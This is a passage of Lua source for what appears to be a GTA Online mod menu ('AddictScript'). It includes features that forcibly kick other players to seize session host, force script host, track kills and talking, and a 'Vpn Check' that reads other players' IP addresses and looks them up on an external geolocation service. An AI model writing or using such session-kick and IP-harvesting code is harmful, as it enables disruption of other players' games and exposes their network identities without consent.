		while f.on do
			system.yield(5000)
			if network.is_session_started() then
				if not network.network_is_host() then
					if player_func.get_host_queue_count() > 0 then
						for pid = 0, 31 do
							if player.is_player_valid(pid) and player.get_player_host_priority(pid) < player.get_player_host_priority(player.player_id()) then
								if network.network_is_host() then
									network.network_session_kick_player(pid)
								elseif player.is_player_host(pid) and player.is_player_modder(pid, -1) then
									script_func.script_event_kick(pid)
								else
									network.force_remove_player(pid)
								end
							end
						end
						system.yield(10000)
					else
						if player.is_player_modder(player.get_host(), -1) then
							script_func.script_event_kick(player.get_host())
						else
							network.force_remove_player(player.get_host())
						end
						system.yield(10000)
					end
				end
			end
		end
	end
end)

feature["Force Session Host"] = menu.add_feature("Force Session Host", "action", localparents["Lobby"].id, function(f)
	if network.is_session_started() then
		if network.network_is_host() then
			menu.notify("You are already the session host!", AddictScript, 3, NotifyColours["red"])
		else
			if player_func.get_host_queue_count() > 0 then
				for pid = 0, 31 do
					if player.is_player_valid(pid) and player.get_player_host_priority(pid) < player.get_player_host_priority(player.player_id()) then
						if network.network_is_host() then
							network.network_session_kick_player(pid)
						elseif player.is_player_host(pid) and player.is_player_modder(pid, -1) then
							script_func.script_event_kick(pid)
						else
							network.force_remove_player(pid)
						end
					end
				end
				system.yield(2000)
				if network.network_is_host() then
					menu.notify("Successfully forced Session Host!", AddictScript, 3, NotifyColours["green"])
				else
					menu.notify("Failed to force Session Host!", AddictScript, 3, NotifyColours["red"])
				end
			else
				if player.is_player_modder(player.get_host(), -1) then
					script_func.script_event_kick(player.get_host())
				else
					network.force_remove_player(player.get_host())
				end
				system.yield(2000)
				if network.network_is_host() then
					menu.notify("Successfully forced Session Host!", AddictScript, 3, NotifyColours["green"])
				else
					menu.notify("Failed to force Session Host!", AddictScript, 3, NotifyColours["red"])
				end
			end
		end
	end
end)

feature["Auto Force Script Host"] = menu.add_feature("Auto Force Script Host", "toggle", localparents["Lobby"].id, function(f)
	if f.on then
		while f.on do
			if not script_func.is_loading_into_session() then
				script_func.force_script_host()
			end
			system.yield(4000)
		end
	end
end)

feature["Force Script Host"] = menu.add_feature("Force Script Host", "action", localparents["Lobby"].id, function(f)
	script_func.force_script_host()
end)

localparents["Notify Player Activity"] = menu.add_feature("Notify Player Activity", "parent", localparents["Lobby"].id)

feature["Typing"] = menu.add_feature("Typing", "toggle", localparents["Notify Player Activity"].id, function(f)
	for pid = 0, 31 do
		MiscPlayerInfo.Typing[pid] = false
	end
	while f.on do
		system.yield(0)
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if script_func.is_player_typing(pid) and not MiscPlayerInfo.Typing[pid] then
						menu.notify(tostring(player.get_player_name(pid)) .. " started typing", AddictScript, 2, NotifyColours["blue"])
						MiscPlayerInfo.Typing[pid] = true
					elseif not script_func.is_player_typing(pid) and MiscPlayerInfo.Typing[pid] then
						menu.notify(tostring(player.get_player_name(pid)) .. " stopped typing", AddictScript, 2, NotifyColours["blue"])
						MiscPlayerInfo.Typing[pid] = false
					end
				end
			end
		end
	end
	for pid = 0, 31 do
		MiscPlayerInfo.Typing[pid] = false
	end
end)

feature["Talking"] = menu.add_feature("Talking", "toggle", localparents["Notify Player Activity"].id, function(f)
	for pid = 0, 31 do
		MiscPlayerInfo.Talking[pid] = false
	end
	while f.on do
		system.yield(0)
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if natives.NETWORK_IS_PLAYER_TALKING(pid) and not MiscPlayerInfo.Talking[pid] then
						menu.notify(tostring(player.get_player_name(pid)) .. " started talking", AddictScript, 2, NotifyColours["blue"])
						MiscPlayerInfo.Talking[pid] = true
					elseif not natives.NETWORK_IS_PLAYER_TALKING(pid) and MiscPlayerInfo.Talking[pid] then
						menu.notify(tostring(player.get_player_name(pid)) .. " stopped talking", AddictScript, 2, NotifyColours["blue"])
						MiscPlayerInfo.Talking[pid] = false
					end
				end
			end
		end
	end
	for pid = 0, 31 do
		MiscPlayerInfo.Talking[pid] = false
	end
end)

feature["Kill Tracker"] = menu.add_feature("Kill Tracker", "toggle", localparents["Notify Player Activity"].id, function(f)
	for pid = 0, 31 do
		MiscPlayerInfo.Dead[pid] = false
	end
	while f.on do
		system.yield(0)
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) then
					if entity.is_entity_dead(player.get_player_ped(pid)) and not MiscPlayerInfo.Dead[pid] then
						local Type
						local EntKiller
						local WeaponHash
						local WeaponString
						local killer, killweapon = natives.NETWORK_GET_PLAYER_KILLER_OF_PLAYER(pid)
						if killer == -1 then
							local killer, killweapon = natives.NETWORK_GET_ENTITY_KILLER_OF_PLAYER(pid)
							if killer == -1 then
								Type = 3
							else
								Type = 2
								EntKiller = killer
								WeaponHash = killweapon
							end
						else
							Type = 1
							EntKiller = killer
							WeaponHash = killweapon
						end
						if Type == 2 then
							local hash = entity.get_entity_model_hash(EntKiller)
							if hash == gameplay.get_hash_key("S_M_Y_Marine_01") or hash == gameplay.get_hash_key("S_M_Y_Marine_02") or hash == gameplay.get_hash_key("S_M_Y_Marine_03") or hash == gameplay.get_hash_key("S_M_M_Marine_01") or hash == gameplay.get_hash_key("S_M_M_Marine_02") or hash == gameplay.get_hash_key("S_M_Y_ArmyMech_01") then
								Type = 4
							elseif hash == gameplay.get_hash_key("S_M_Y_Cop_01") or hash == gameplay.get_hash_key("S_M_Y_Swat_01") or hash == gameplay.get_hash_key("S_M_Y_Sheriff_01") then
								Type = 5
							else
								Type = 6
							end
						end
						if Type ~= nil then
							if WeaponHash ~= 0 and WeaponHash ~= nil then
								if WeaponHash == -1569615261 then
									WeaponString = "with their Fist"
								elseif WeaponHash == -1716189206 then
									WeaponString = "with a Knife"
								elseif WeaponHash == 1737195953 then
									WeaponString = "with a Nightstick"
								elseif WeaponHash == 1317494643 then
									WeaponString = "with a Hammer"
								elseif WeaponHash == -1786099057 then
									WeaponString = "with a Bat"
								elseif WeaponHash == -2067956739 then
									WeaponString = "with a Crowbar"
								elseif WeaponHash == 1141786504 then
									WeaponString = "with a Golfclub"
								elseif WeaponHash == -102323637 then
									WeaponString = "with a Bottle"
								elseif WeaponHash == -1834847097 then
									WeaponString = "with a Dagger"
								elseif WeaponHash == -102973651 then
									WeaponString = "with a Hatchet"
								elseif WeaponHash == -656458692 then
									WeaponString = "with a Knuckle Duster"
								elseif WeaponHash == -581044007 then
									WeaponString = "with a Machete"
								elseif WeaponHash == -1951375401 then
									WeaponString = "with a Flashlight"
								elseif WeaponHash == -538741184 then
									WeaponString = "with a Switchblade"
								elseif WeaponHash == -1810795771 then
									WeaponString = "with a Poolcue"
								elseif WeaponHash == 419712736 then
									WeaponString = "with a Wrench"
								elseif WeaponHash == -853065399 then
									WeaponString = "with a Battleaxe"
								elseif WeaponHash == 453432689 or WeaponHash == 3219281620 or WeaponHash == 1593441988 or WeaponHash == -1716589765 or WeaponHash == -1076751822 then
									WeaponString = "with a Pistol"
								elseif WeaponHash == -771403250 then
									WeaponString = "with a Heavy Pistol"
								elseif WeaponHash == 137902532 then
									WeaponString = "with a Vintage Pistol"
								elseif WeaponHash == -598887786 then
									WeaponString = "with a Marksman Pistol"
								elseif WeaponHash == -1045183535 then
									WeaponString = "with a Revolver"
								elseif WeaponHash == 584646201 then
									WeaponString = "with an APPistol"
								elseif WeaponHash == 911657153 then
									WeaponString = "with a Stun Gun"
								elseif WeaponHash == 1198879012 then
									WeaponString = "with a Flare Gun"
								elseif WeaponHash == 324215364 then
									WeaponString = "with a Micro SMG"
								elseif WeaponHash == -619010992 then
									WeaponString = "with a Machine Pistol"
								elseif WeaponHash == 736523883 or WeaponHash == 2024373456 or WeaponHash == -270015777 then
									WeaponString = "with an SMG"
								elseif WeaponHash == 171789620 then
									WeaponString = "with a Combat PDW"
								elseif WeaponHash == -1660422300 or WeaponHash == 2144741730 or WeaponHash == 3686625920 then
									WeaponString = "with an MG"
								elseif WeaponHash == 1627465347 then
									WeaponString = "with a Gusenberg"
								elseif WeaponHash == -1121678507 then
									WeaponString = "with a Mini SMG"
								elseif WeaponHash == -1074790547 or WeaponHash == 961495388 then
									WeaponString = "with an Assault Rifle"
								elseif WeaponHash == -2084633992 or WeaponHash == 4208062921 then
									WeaponString = "with a Carbine Rifle"
								elseif WeaponHash == -1357824103 then
									WeaponString = "with an Advanced Rifle"
								elseif WeaponHash == 1063057011 then
									WeaponString = "with a Special Carbine"
								elseif WeaponHash == 2132975508 then
									WeaponString = "with a Pullup Rifle"
								elseif WeaponHash == 1649403952 then
									WeaponString = "with a Compact Rifle"
								elseif WeaponHash == 100416529 then
									WeaponString = "with a Sniper Rifle"
								elseif WeaponHash == 1853742572 then
									WeaponString = "with a Precision Rifle"
								elseif WeaponHash == 205991906 or WeaponHash == 177293209 then
									WeaponString = "with a Heavy Sniper"
								elseif WeaponHash == -774502771 then
									WeaponString = "with a Service Carbine"
								elseif WeaponHash == -952879014 then
									WeaponString = "with a Marksman Rifle"
								elseif WeaponHash == 487013001 then
									WeaponString = "with a Pump Shotgun"
								elseif WeaponHash == 2017895192 then
									WeaponString = "with a Sawnoff Shotgun"
								elseif WeaponHash == -1654528753 then
									WeaponString = "with a Pullup Shotgun"
								elseif WeaponHash == -494615257 then
									WeaponString = "with an Assault Shotgun"
								elseif WeaponHash == -1466123874 then
									WeaponString = "with a Musket"
								elseif WeaponHash == 984333226 then
									WeaponString = "with a Heavy Shotgun"
								elseif WeaponHash == -275439685 then
									WeaponString = "with a Double Barrel Shotgun"
								elseif WeaponHash == 317205821 then
									WeaponString = "with an Auto Shotgun"
								elseif WeaponHash == -1568386805 then
									WeaponString = "with a Grenade Launcher"
								elseif WeaponHash == -1312131151 then
									WeaponString = "with an RPG"
								elseif WeaponHash == 1119849093 then
									WeaponString = "with a Minigun"
								elseif WeaponHash == 2138347493 then
									WeaponString = "with a Firework Launcher"
								elseif WeaponHash == 1834241177 then
									WeaponString = "with a Railgun"
								elseif WeaponHash == 1672152130 then
									WeaponString = "with a Homing Launcher"
								elseif WeaponHash == 1305664598 then
									WeaponString = "with a Smoke Grenade Launcher"
								elseif WeaponHash == 125959754 then
									WeaponString = "with a Compact Launcher"
								elseif WeaponHash == -1813897027 then
									WeaponString = "with a Grenade"
								elseif WeaponHash == 741814745 then
									WeaponString = "with a Sticky Bomb"
								elseif WeaponHash == -1420407917 then
									WeaponString = "with a Proximity Mine"
								elseif WeaponHash == -1600701090 then
									WeaponString = "with BZ Gas"
								elseif WeaponHash == 615608432 then
									WeaponString = "with a Molotov"
								elseif WeaponHash == 101631238 then
									WeaponString = "with a Fire Extinguisher"
								elseif WeaponHash == 883325847 then
									WeaponString = "with a Petrol Can"
								elseif WeaponHash == 1233104067 then
									WeaponString = "with a Flare"
								elseif WeaponHash == 600439132 then
									WeaponString = "with a Ball"
								elseif WeaponHash == 126349499 then
									WeaponString = "with a Snowball"
								elseif WeaponHash == -37975472 then
									WeaponString = "with a Smoke Grenade"
								elseif WeaponHash == -1169823560 then
									WeaponString = "with a Pipebomb"
								elseif WeaponHash == -72657034 then
									WeaponString = "with a Parachute"
								end
							end
							local headshotstring = ""
							local success, hit_bone = natives.GET_PED_LAST_DAMAGE_BONE(player.get_player_ped(pid))
							if success and (hit_bone == 12844 or hit_bone == 31086) then
								headshotstring = " (Headshot)"
							end
							if Type == 1 and EntKiller ~= pid then
								if WeaponString == nil then
									menu.notify(tostring(player.get_player_name(EntKiller)) .. " killed " .. tostring(player.get_player_name(pid)) .. headshotstring, "AddictScript Kill Tracker", 8, NotifyColours["blue"])
								else
									if WeaponHash == 100416529 or WeaponHash == 205991906 or WeaponHash == 177293209 or WeaponHash == -952879014 then
										menu.notify(tostring(player.get_player_name(EntKiller)) .. " " .. player_func.get_player_flag_string(EntKiller) .. " killed " .. tostring(player.get_player_name(pid)) .. " " .. player_func.get_player_flag_string(pid) .. " " .. WeaponString .. " (" .. text_func.round(utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(EntKiller))) .. "m)" .. headshotstring, "AddictScript Kill Tracker", 8, NotifyColours["blue"])
									else
										menu.notify(tostring(player.get_player_name(EntKiller)) .. " " .. player_func.get_player_flag_string(EntKiller) .. " killed " .. tostring(player.get_player_name(pid)) .. " " .. player_func.get_player_flag_string(pid) .. " " .. WeaponString .. headshotstring, "AddictScript Kill Tracker", 8, NotifyColours["blue"])
									end
								end
							elseif Type == 1 and EntKiller == pid then
								menu.notify(tostring(player.get_player_name(pid)) .. " " .. player_func.get_player_flag_string(pid) .. " committed suicide", "AddictScript Kill Tracker", 6, NotifyColours["blue"])
							elseif Type == 4 then
								if WeaponString == nil then
									menu.notify(tostring(player.get_player_name(pid)) .. " got killed by a Marine", "AddictScript Kill Tracker", 8, NotifyColours["blue"])
								else
									menu.notify(tostring(player.get_player_name(pid)) .. " got killed by a Marine " .. WeaponString .. headshotstring, "AddictScript Kill Tracker", 8, NotifyColours["blue"])
								end
							elseif Type == 5 then
								if WeaponString == nil then
									menu.notify(tostring(player.get_player_name(pid)) .. " got killed by a Cop", "AddictScript Kill Tracker", 8, NotifyColours["blue"])
								else
									menu.notify(tostring(player.get_player_name(pid)) .. " got killed by a Cop " .. WeaponString .. headshotstring, "AddictScript Kill Tracker", 8, NotifyColours["blue"])
								end
							elseif Type == 6 then
								if WeaponString == nil then
									if ped.is_ped_in_any_vehicle(EntKiller) then
										if streaming.is_model_a_train(entity.get_entity_model_hash(ped.get_vehicle_ped_is_using(EntKiller))) then
											menu.notify(tostring(player.get_player_name(pid)) .. " got ran over by a Train", "AddictScript Kill Tracker", 8, NotifyColours["blue"])
										else
											menu.notify(tostring(player.get_player_name(pid)) .. " got ran over by a Pedestrian", "AddictScript Kill Tracker", 8, NotifyColours["blue"])
										end
									else
										menu.notify(tostring(player.get_player_name(pid)) .. " got killed by a Pedestrian", "AddictScript Kill Tracker", 8, NotifyColours["blue"])
									end
								else
									menu.notify(tostring(player.get_player_name(pid)) .. " got killed by a Pedestrian " .. WeaponString .. headshotstring, "AddictScript Kill Tracker", 8, NotifyColours["blue"])
								end
							else
								menu.notify(tostring(player.get_player_name(pid)) .. " " .. player_func.get_player_flag_string(pid) .. " died", "AddictScript Kill Tracker", 8, NotifyColours["blue"])
							end
						end
						MiscPlayerInfo.Dead[pid] = true
					elseif not entity.is_entity_dead(player.get_player_ped(pid)) and MiscPlayerInfo.Dead[pid] then
						MiscPlayerInfo.Dead[pid] = false
					end
				end
			end
		end
	end
	for pid = 0, 31 do
		MiscPlayerInfo.Dead[pid] = false
	end
end)

feature["Vpn Check"] = menu.add_feature("Vpn Check", "toggle", localparents["Notify Player Activity"].id, function(f, pid)
	if f.on then
		listeners["Vpn Check"] = event.add_event_listener("player_join", function(joined_player)
			if joined_player.player ~= player.player_id() and player.is_player_valid(joined_player.player) then
				local success, webdata = web.get("http://ip-api.com/json/" .. utilities.dec_to_ipv4(player.get_player_ip(joined_player.player)) .. "?fields=147456")
				if string.find(webdata, "success") and success ~= "429" then
					if string.find(webdata, "true") then
						menu.notify(tostring( player.get_player_name(joined_player.player)) .. " is using a Vpn!\n" .. player.get_player_scid(joined_player.player) .. "/" .. utilities.dec_to_ipv4(player.get_player_ip(joined_player.player)) .. "", AddictScript, 12, NotifyColours["blue"])
					end
				end
			end
		end)
	end
	if not f.on then
		if listeners["Vpn Check"] then
			event.remove_event_listener("player_join", listeners["Vpn Check"])
			listeners["Vpn Check"] = nil
		end
	end
end)

localparents["Notify Session Activity"] = menu.add_feature("Notify Session Activity", "parent", localparents["Lobby"].id)

feature["Session Host Migration"] = menu.add_feature("Session Host Migration", "toggle", localparents["Notify Session Activity"].id, function(f)
	local sh
	local sh_name
	while f.on do
		if network.is_session_started() then
			if player.get_host() ~= -1 and player.get_host() ~= nil then
				sh = player.get_host()
				sh_name = player.get_player_name(sh)
				system.yield(2000)
				if sh ~= -1 and sh ~= nil then
					local new_sh = player.get_host()
					if sh ~= new_sh and new_sh ~= -1 and new_sh ~= nil then
						if player.is_player_valid(new_sh) then
							menu.notify("Session Host migrated from " .. tostring(sh_name) .. " to " .. tostring(player.get_player_name(new_sh)), AddictScript, 6, NotifyColours["blue"])
						end
					end
				end
			end
		end
		system.yield(0)
	end
end)

feature["Script Host Migration"] = menu.add_feature("Script Host Migration", "toggle", localparents["Notify Session Activity"].id, function(f)
	local sh
	local sh_name
	while f.on do
		if network.is_session_started() then
			if script.get_host_of_this_script() ~= -1 and script.get_host_of_this_script() ~= nil then
				sh = script.get_host_of_this_script()
				sh_name = player.get_player_name(sh)
				system.yield(2000)
				if sh ~= -1 and sh ~= nil then
					local new_sh = script.get_host_of_this_script()
					if sh ~= new_sh and new_sh ~= -1 and new_sh ~= nil then
						if player.is_player_valid(new_sh) then
							menu.notify("Script Host migrated from " .. tostring(sh_name) .. " to " .. tostring(player.get_player_name(new_sh)), AddictScript, 6, NotifyColours["blue"])
						end
					end
				end
			end
		end
		system.yield(0)
	end
end)

feature["Launcher Host Migration"] = menu.add_feature("Launcher Host Migration", "toggle", localparents["Notify Session Activity"].id, function(f)
	local sh
	local sh_name
	while f.on do
		if network.is_session_started() then
			if natives.NETWORK_GET_HOST_OF_SCRIPT("am_launcher", -1, 0) ~= -1 and natives.NETWORK_GET_HOST_OF_SCRIPT("am_launcher", -1, 0) ~= nil then
				sh = natives.NETWORK_GET_HOST_OF_SCRIPT("am_launcher", -1, 0)
				sh_name = player.get_player_name(sh)
				system.yield(2000)
				if sh ~= -1 and sh ~= nil then
					local new_sh = natives.NETWORK_GET_HOST_OF_SCRIPT("am_launcher", -1, 0)
					if sh ~= new_sh and new_sh ~= -1 and new_sh ~= nil then
						if player.is_player_valid(new_sh) then
							menu.notify("Launcher Host migrated from " .. tostring(sh_name) .. " to " .. tostring(player.get_player_name(new_sh)), AddictScript, 6, NotifyColours["blue"])
						end
					end
				end
			end
		end
		system.yield(0)
	end
end)

feature["Player Connection"] = menu.add_feature("Player Connection", "toggle", localparents["Notify Session Activity"].id, function(f)
	local YouSplitConnection = {}
	local SplitConnectionWithYou = {}
	while f.on do
		if not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if not YouSplitConnection[pid] and natives.NETWORK_GET_AVERAGE_LATENCY_FOR_PLAYER_2(pid) > 99999 then
						menu.notify("You split syncs with " .. tostring(player.get_player_name(pid)), AddictScript, 6, NotifyColours["blue"])
						YouSplitConnection[pid] = true
					elseif YouSplitConnection[pid] and natives.NETWORK_GET_AVERAGE_LATENCY_FOR_PLAYER_2(pid) < 99999 and player.get_player_coords(pid).x < 10700 and player.get_player_coords(pid).y < 10700 and player.get_player_coords(pid).x > -10700 and player.get_player_coords(pid).y > -10700 then
						menu.notify("You regained syncs with " .. tostring(player.get_player_name(pid)), AddictScript, 6, NotifyColours["blue"])
						YouSplitConnection[pid] = false
					end
					if not SplitConnectionWithYou[pid] and natives.NETWORK_GET_AVERAGE_PACKET_LOSS_FOR_PLAYER(pid) == 1.0 then
						menu.notify(tostring(player.get_player_name(pid)) .. " lost connection with you", AddictScript, 6, NotifyColours["blue"])
						SplitConnectionWithYou[pid] = true
					elseif SplitConnectionWithYou[pid] and natives.NETWORK_GET_AVERAGE_PACKET_LOSS_FOR_PLAYER(pid) <= 0.25 then
						menu.notify(tostring(player.get_player_name(pid)) .. " regained connection with you", AddictScript, 6, NotifyColours["blue"])
						SplitConnectionWithYou[pid] = false
					end
				end
			end
		else
			YouSplitConnection = {}
			SplitConnectionWithYou = {}
		end
		system.yield(0)
	end
end)

localparents["Session Info Window"] = menu.add_feature("Session Info Window", "parent", localparents["Lobby"].id)

feature["Enable Session Info Window"] = menu.add_feature("Enable", "toggle", localparents["Session Info Window"].id, function(f)
	local sprite2
	if utils.file_exists(utils.get_appdata_path(Paths.AddictScript.Data, "sprite2.png")) then
		sprite2 = scriptdraw.register_sprite(utils.get_appdata_path(Paths.AddictScript.Data, "sprite2.png"))
	end
	while f.on do
		system.yield(0)
		local current_host = player.get_player_name(player.get_host())
		if player.get_host() == -1 then
			current_host = "-"
		end
		local next_host = player.get_player_name(player.get_host())
		if player.get_host() ~= -1 and script_func.get_player_from_host_priority(1) == player.get_host() and script_func.get_player_from_host_priority(2) ~= nil then
			next_host = player.get_player_name(script_func.get_player_from_host_priority(2))
		elseif player.get_host() ~= -1 and script_func.get_player_from_host_priority(1) ~= player.get_host() and script_func.get_player_from_host_priority(1) ~= nil then
			next_host = player.get_player_name(script_func.get_player_from_host_priority(1))
		else
			next_host = "-"
		end
		local current_script_host = player.get_player_name(script.get_host_of_this_script())
		if script.get_host_of_this_script() == -1 then
			current_script_host = "-"
		end
		local next_script_host = player.get_player_name(player.get_host())
		if network.is_session_started() and script_func.get_next_script_host() ~= -1 and script_func.get_next_script_host() ~= script.get_host_of_this_script() and script_func.get_next_script_host() ~= nil then
			next_script_host = player.get_player_name(script_func.get_next_script_host())
		else
			next_script_host = "-"
		end
		local modders = 0
		for pid = 0, 31 do
			if player.is_player_valid(pid) and player.is_player_modder(pid, -1) then
				modders = modders + 1
			end
		end
		local friends = 0
		for pid = 0, 31 do
			if player.is_player_valid(pid) and player.is_player_friend(pid) then
				friends = friends + 1
			end
		end
		if feature["Session Info Rounded Corners"].on and sprite2 and utils.file_exists(utils.get_appdata_path(Paths.AddictScript.Data, "sprite2.png")) then
			scriptdraw.draw_sprite(sprite2, v2(feature["Session Info Window X Position"].value / 100, feature["Session Info Window Y Position"].value / 100), feature["Session Info Window Background Size"].value, 0, text_func.rgba_to_uint32_t(feature["Session Info Window Background R"].value, feature["Session Info Window Background G"].value, feature["Session Info Window Background B"].value, feature["Session Info Window Background A"].value))
		else
			scriptdraw.draw_rect(v2(feature["Session Info Window X Position"].value / 100, feature["Session Info Window Y Position"].value / 100), v2(feature["Session Info Window Background Size"].value / 4, feature["Session Info Window Background Size"].value * 0.63), text_func.rgba_to_uint32_t(feature["Session Info Window Background R"].value, feature["Session Info Window Background G"].value, feature["Session Info Window Background B"].value, feature["Session Info Window Background A"].value))
		end
		scriptdraw.draw_text("Session Info", v2(feature["Session Info Window X Position"].value / 100 - feature["Session Info Window Background Size"].value / 8 + feature["Session Info Window Text Offset"].value / 1000, feature["Session Info Window Y Position"].value / 100 - feature["Session Info Window Background Size"].value * -0.3), v2(feature["Session Info Window Text Size"].value, feature["Session Info Window Text Size"].value), feature["Session Info Window Text Size"].value, text_func.rgba_to_uint32_t(feature["Session Info Window Text R"].value, feature["Session Info Window Text G"].value, feature["Session Info Window Text B"].value, feature["Session Info Window Text A"].value), 1 << 1, math.tointeger(feature["Session Info Window Text Font"].value))
		scriptdraw.draw_text("Session Host: " .. tostring(current_host) .. "\n\nNext Host: " .. tostring(next_host) .. "\n\nScript Host: " .. tostring(current_script_host) .. "\n\nNext Script Host: " .. tostring(next_script_host) .. "\n\nType: " .. tostring(script_func.get_session_type()) .. "\n\nHidden: " .. tostring(not natives.NETWORK_SESSION_IS_VISIBLE()) .. "\n\nPlayer Count: " .. tostring(player.player_count()) .. "\n\nModder Count: " .. tostring(modders) .. "\n\nFriend Count: " .. tostring(friends), v2(feature["Session Info Window X Position"].value / 100 - feature["Session Info Window Background Size"].value / 8 + feature["Session Info Window Text Offset"].value / 1000, feature["Session Info Window Y Position"].value / 100 - feature["Session Info Window Background Size"].value * -0.25), v2(feature["Session Info Window Text Size"].value, feature["Session Info Window Text Size"].value), feature["Session Info Window Text Size"].value, text_func.rgba_to_uint32_t(feature["Session Info Window Text R"].value, feature["Session Info Window Text G"].value, feature["Session Info Window Text B"].value, feature["Session Info Window Text A"].value), 1 << 1, math.tointeger(feature["Session Info Window Text Font"].value))
		local line_offset = 0.0
		if feature["Session Info Rounded Corners"].on and sprite2 and utils.file_exists(utils.get_appdata_path(Paths.AddictScript.Data, "sprite2.png")) then
			line_offset = 0.0025
		end
		scriptdraw.draw_line(v2(feature["Session Info Window X Position"].value / 100 - feature["Session Info Window Background Size"].value / 8 + line_offset, feature["Session Info Window Y Position"].value / 100 - feature["Session Info Window Background Size"].value * -0.266), v2(feature["Session Info Window X Position"].value / 100 + feature["Session Info Window Background Size"].value / 8 - line_offset, feature["Session Info Window Y Position"].value / 100 - feature["Session Info Window Background Size"].value * -0.266), 1, text_func.rgba_to_uint32_t(feature["Session Info Window Line R"].value, feature["Session Info Window Line G"].value, feature["Session Info Window Line B"].value, feature["Session Info Window Line A"].value))
		scriptdraw.draw_line(v2(feature["Session Info Window X Position"].value / 100 - feature["Session Info Window Background Size"].value / 8 + line_offset, feature["Session Info Window Y Position"].value / 100 - feature["Session Info Window Background Size"].value * -0.265), v2(feature["Session Info Window X Position"].value / 100 + feature["Session Info Window Background Size"].value / 8 - line_offset, feature["Session Info Window Y Position"].value / 100 - feature["Session Info Window Background Size"].value * -0.265), 1, text_func.rgba_to_uint32_t(feature["Session Info Window Line R"].value, feature["Session Info Window Line G"].value, feature["Session Info Window Line B"].value, feature["Session Info Window Line A"].value))
		scriptdraw.draw_line(v2(feature["Session Info Window X Position"].value / 100 - feature["Session Info Window Background Size"].value / 8 + line_offset, feature["Session Info Window Y Position"].value / 100 - feature["Session Info Window Background Size"].value * -0.264), v2(feature["Session Info Window X Position"].value / 100 + feature["Session Info Window Background Size"].value / 8 - line_offset, feature["Session Info Window Y Position"].value / 100 - feature["Session Info Window Background Size"].value * -0.264), 1, text_func.rgba_to_uint32_t(feature["Session Info Window Line R"].value, feature["Session Info Window Line G"].value, feature["Session Info Window Line B"].value, feature["Session Info Window Line A"].value))
	end
end)

feature["Session Info Rounded Corners"] = menu.add_feature("Rounded Corners", "toggle", localparents["Session Info Window"].id, function(f)
end)

feature["Session Info Window X Position"] = menu.add_feature("X Position", "autoaction_value_f", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window X Position"].max = 100.0
feature["Session Info Window X Position"].min = -100.0
feature["Session Info Window X Position"].mod = 0.5
feature["Session Info Window X Position"].value = 0.0

feature["Session Info Window Y Position"] = menu.add_feature("Y Position", "autoaction_value_f", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Y Position"].max = 100.0
feature["Session Info Window Y Position"].min = -100.0
feature["Session Info Window Y Position"].mod = 0.5
feature["Session Info Window Y Position"].value = 0.0

feature["Session Info Window Background Size"] = menu.add_feature("Background Size", "autoaction_value_f", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Background Size"].max = 2.00
feature["Session Info Window Background Size"].min = 0.10
feature["Session Info Window Background Size"].mod = 0.01
feature["Session Info Window Background Size"].value = 1.00

feature["Session Info Window Text Size"] = menu.add_feature("Text Size", "autoaction_value_f", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Text Size"].max = 2.00
feature["Session Info Window Text Size"].min = 0.50
feature["Session Info Window Text Size"].mod = 0.01
feature["Session Info Window Text Size"].value = 0.65

feature["Session Info Window Text Offset"] = menu.add_feature("Text Offset", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Text Offset"].max = 50
feature["Session Info Window Text Offset"].min = 0
feature["Session Info Window Text Offset"].mod = 1
feature["Session Info Window Text Offset"].value = 6

feature["Session Info Window Background R"] = menu.add_feature("Background R", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Background R"].max = 255
feature["Session Info Window Background R"].min = 0
feature["Session Info Window Background R"].mod = 5
feature["Session Info Window Background R"].value = 35

feature["Session Info Window Background G"] = menu.add_feature("Background G", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Background G"].max = 255
feature["Session Info Window Background G"].min = 0
feature["Session Info Window Background G"].mod = 5
feature["Session Info Window Background G"].value = 35

feature["Session Info Window Background B"] = menu.add_feature("Background B", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Background B"].max = 255
feature["Session Info Window Background B"].min = 0
feature["Session Info Window Background B"].mod = 5
feature["Session Info Window Background B"].value = 35

feature["Session Info Window Background A"] = menu.add_feature("Background A", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Background A"].max = 255
feature["Session Info Window Background A"].min = 0
feature["Session Info Window Background A"].mod = 5
feature["Session Info Window Background A"].value = 255

feature["Session Info Window Text R"] = menu.add_feature("Text R", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Text R"].max = 255
feature["Session Info Window Text R"].min = 0
feature["Session Info Window Text R"].mod = 5
feature["Session Info Window Text R"].value = 255

feature["Session Info Window Text G"] = menu.add_feature("Text G", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Text G"].max = 255
feature["Session Info Window Text G"].min = 0
feature["Session Info Window Text G"].mod = 5
feature["Session Info Window Text G"].value = 255

feature["Session Info Window Text B"] = menu.add_feature("Text B", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Text B"].max = 255
feature["Session Info Window Text B"].min = 0
feature["Session Info Window Text B"].mod = 5
feature["Session Info Window Text B"].value = 255

feature["Session Info Window Text A"] = menu.add_feature("Text A", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Text A"].max = 255
feature["Session Info Window Text A"].min = 0
feature["Session Info Window Text A"].mod = 5
feature["Session Info Window Text A"].value = 255

feature["Session Info Window Text Font"] = menu.add_feature("Text Font", "autoaction_value_i", localparents["Session Info Window"].id, function(f)
end)
feature["Session Info Window Text Font"].max = 8
feature["Session Info Window Text Font"].min = 0
feature["Session Info Window Text Font"].mod = 1
feature["Session Info Window Text Font"].value = 1

